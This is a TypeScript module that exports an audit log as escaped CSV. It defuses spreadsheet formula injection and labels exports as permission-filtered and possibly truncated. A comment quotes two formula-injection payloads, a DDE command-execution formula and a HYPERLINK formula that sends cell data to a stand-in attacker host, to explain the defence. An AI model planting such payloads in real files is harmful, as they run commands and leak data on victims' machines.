import type { ServerResponse } from 'node:http';
import type { AuditEvent } from './model.js';

// CSV export of the audit log (CORE-PLAN.md Epic E, M4: "Filterable by actor,
// action, and date. Exportable as CSV").
//
// The reader on the other end is a compliance officer with Excel, so the
// escaping follows RFC 4180 exactly rather than "good enough": a field is
// quoted when it contains a quote, a comma, a CR, an LF, or leading/trailing
// whitespace, and an embedded quote is doubled. Records end with CRLF. The
// details column carries the event's JSON verbatim inside one field, which is
// the case that breaks naive exporters, so it is tested.

// Formula injection. A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`,
// tab or CR as a formula, not as text, and evaluates it when the file is
// opened — `=cmd|'/c calc'!A0`, `=HYPERLINK("http://attacker/"&A1)` and their
// relatives. Every one of those characters is legal in a page title, a
// send-back comment, a source name or an imported filename, and all of those
// reach the audit log and therefore this export. The reader on the other end is
// a compliance lead double-clicking the file, which is exactly the person this
// must not happen to.
//
// The neutralisation is the conventional one: prefix a single apostrophe, which
// every spreadsheet reads as "the rest of this cell is text" and strips on
// display. It is a visible change to the value — that is why it is applied only
// to a cell that would otherwise be executed, and why a field that is simply a
// number (including a negative one) is left exactly as it was.
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function neutralize(text: string): string {
  if (!FORMULA_LEAD.test(text)) return text;
  if (text.trim() !== '' && Number.isFinite(Number(text))) return text; // -42 is a number, not a formula
  return `'${text}`;
}

/** RFC 4180 field escaping, with spreadsheet formulas defused (see above). */
export function csvField(value: unknown): string {
  if (value === null || value === undefined) return '';
  const text = neutralize(typeof value === 'string' ? value : String(value));
  const needsQuotes = /["',\r\n]/.test(text) || text !== text.trim();
  // A comma or quote always forces quoting; a bare apostrophe does not, but the
  // test above is cheap and quoting more than required is still valid CSV.
  if (!needsQuotes) return text;
  return `"${text.replace(/"/g, '""')}"`;
}

/** One RFC 4180 record, CRLF-terminated. */
export function csvRow(values: unknown[]): string {
  return values.map(csvField).join(',') + '\r\n';
}

// The first column is the event's GLOBAL id, and that is a known, deliberate
// disclosure (fourth round, Ruth): to an exporter whose permissions withhold
// part of the log, gaps in the id sequence say how much activity they cannot
// see. It stays anyway, because everything that makes this file verifiable
// hangs off it — it is an input to the chain hash (auditchain.ts), the cursor
// the export walk and the interactive walk both page by, and the column two
// exports taken at different times are reconciled row-for-row by. A per-view
// renumbering would defeat all three to hide a volume, not a content; the
// honest posture is that WHAT limited readers cannot see stays withheld, and
// THAT things are withheld is not itself a secret.
export const AUDIT_CSV_COLUMNS = [
  'id',
  'at',
  'actor_id',
  'actor_kind',
  'action',
  'collection_id',
  'page_id',
  'details',
] as const;

// WHAT AN EXPORT CONTAINS
//
// This used to read 1,000, the same number as one page of the JSON query, and
// that made the export the FIRST PAGE of a filtered log rather than the
// filtered log. An auditor who exports "everything by this actor" and receives
// the most recent thousand rows of it, with nothing on the file to say so, has
// been handed a sample presented as a population — which is the same defect as
// the screen showing 200 of 1,187 in silence, in the one artefact that leaves
// the building. So the export now walks the whole filtered population, a page
// at a time, and this is the ceiling on the whole walk rather than on one page.
//
// It is still a ceiling, because the response is built in memory as one string
// and something has to bound it. A hundred thousand events is a large record's
// several years and roughly twenty megabytes of CSV; a deployment that exceeds
// it gets `x-canon-truncated: true` and should narrow with from/to and export
// the windows in turn.
export const AUDIT_CSV_MAX_ROWS = 100_000;

// The chunk the walk reads at a time — one page of the audit query. Nothing
// about the file depends on it; it exists so a large export is a sequence of
// bounded statements rather than one enormous one.
export const AUDIT_CSV_PAGE_ROWS = 1000;

// A file that leaves the building must carry the same caveat the screen does
// and the attestation bundle does: the events in it are PERMISSION-FILTERED to
// whoever exported it, and the file is not a claim that the log holds no more.
// The screen's `x-canon-truncated` caveat rides in a response header, but a
// header does not survive the download — an auditor opening the saved file has
// only the bytes — so this one is a `#` comment on the first line, where a
// reader (and the tools that skip `#`) meet it before the header row. It never
// names the hidden count; that a limited reader sees less is not a secret, how
// much less would be.
export const AUDIT_CSV_SCOPE_NOTE =
  '# PERMISSION-FILTERED: this file holds only the audit events the actor who exported it may see. ' +
  'It is not a claim that nothing else exists in the log.';

export function auditCsv(events: AuditEvent[]): string {
  let out = AUDIT_CSV_SCOPE_NOTE + '\r\n';
  out += csvRow([...AUDIT_CSV_COLUMNS]);
  for (const event of events) {
    out += csvRow([
      event.id,
      event.at,
      event.actorId,
      event.actorKind,
      event.action,
      event.collectionId,
      event.pageId,
      JSON.stringify(event.details ?? {}),
    ]);
  }
  return out;
}

// A response that is not JSON. The api.ts `send()` helper writes JSON and stays
// that way; a handler returning one of these writes itself instead. This is the
// whole of the non-JSON response path.
export class RawResponse {
  constructor(
    readonly status: number,
    readonly headers: Record<string, string>,
    readonly body: string,
  ) {}

  writeTo(res: ServerResponse): void {
    res.writeHead(this.status, { ...this.headers, 'content-length': String(Buffer.byteLength(this.body)) });
    res.end(this.body);
  }
}

function stamp(): string {
  return new Date().toISOString().replace(/[:.]/g, '-').replace(/Z$/, '');
}

/** The audit CSV as a downloadable file response. */
export function auditCsvResponse(events: AuditEvent[]): RawResponse {
  return new RawResponse(
    200,
    {
      'content-type': 'text/csv; charset=utf-8',
      'content-disposition': `attachment; filename="canon-audit-${stamp()}.csv"`,
      'x-canon-row-cap': String(AUDIT_CSV_MAX_ROWS),
      // How many records are actually in the file, so a reader can check the
      // file against the count the screen showed them without counting lines
      // in a spreadsheet — and can tell an empty result from a failed one.
      'x-canon-rows': String(events.length),
      // An export that exactly fills the cap may have more behind it; say so
      // rather than let an auditor assume they hold the whole log.
      'x-canon-truncated': events.length >= AUDIT_CSV_MAX_ROWS ? 'true' : 'false',
    },
    auditCsv(events),
  );
}
